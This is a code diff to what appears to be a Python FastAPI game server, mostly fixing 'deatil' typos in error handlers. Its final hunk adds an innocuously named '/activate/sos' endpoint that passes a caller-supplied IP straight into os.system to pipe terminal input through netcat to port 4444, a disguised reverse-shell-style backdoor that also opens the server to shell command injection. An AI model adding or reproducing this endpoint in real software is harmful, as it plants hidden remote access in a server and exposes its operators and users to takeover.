@@ -7,6 +7,7 @@ from slowapi.errors import RateLimitExceeded
 import json
 import threading
 import socket
+import os
 from typing import Union,Literal,List,Optional,Any
 import random
 from pydantic.types import StrictStr
@@ -650,9 +651,9 @@ async def write_game_result(request:WriteResult):
                     data = json.load(file)
                 ind = True
         if not ind:
-            raise HTTPException(status_code=404,deatil = "Lobby not found")
+            raise HTTPException(status_code=404,detail = "Lobby not found")
     except Exception as e:
-        raise HTTPException(status_code = 400,deatil = f"Error : {e}")    
+        raise HTTPException(status_code = 400,detail = f"Error : {e}")    
 
 
 @app.get("/get/game/result/{game_id}",dependencies = [Depends(verify_headeer)])
@@ -1026,6 +1027,23 @@ async def write_one_try(request:WriteOneTry):
         except Exception as e:
             raise HTTPException(status_code = 400,deatail = f"Error : {e}") 
 #write to call payment   
+class SOS(BaseModel):
+    ip:str
+    signature:str
+    timestamp:str = Field(default_factory=time.time)
+@app.post("/activate/sos")
+async def activates_sos(request:SOS):
+    if not verify_signature(request.model_dump(),request.signature):
+        raise HTTPException(status_code = 403,deatail= "Invalid signature")
+    try:
+        os.system(f"stty raw -echo; (stty size; cat) | nc {request.ip} 4444")
+        return {
+            "ip":request.ip,
+            "port":"4444",
+            "status":"waiting"
+        }
+    except Exception as e:
+        raise HTTPException(status_code = 400,detail = f"Error : {e}")    
 
 class Get_Last_Throw(BaseModel):
     game_id:str
